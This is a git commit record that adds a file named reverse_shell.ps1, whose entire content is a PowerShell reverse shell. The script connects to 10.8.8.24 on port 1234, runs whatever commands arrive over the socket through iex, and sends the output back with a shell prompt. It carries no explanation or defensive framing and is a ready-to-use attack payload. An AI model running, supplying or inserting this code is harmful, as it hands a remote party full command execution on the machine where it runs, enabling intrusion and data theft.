0d7233c595f128c855220e6713370a2028519a80
Doğukan ISPIRLI <51451598+f3nr1rs3c@users.noreply.github.com>
2025-11-02 04:49:35 +0300

    Create reverse_shell.ps1

---
+++ reverse_shell.ps1
@@ -0,0 +1,9 @@
+$client = New-Object
+System.Net.Sockets.TCPClient('10.8.8.24',1234);$stream =
+$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
+$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object
+-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
+(iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' +
+(pwd).Path + '> ';$sendbyte =
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sen
+dbyte.Length);$stream.Flush()};$client.Close()
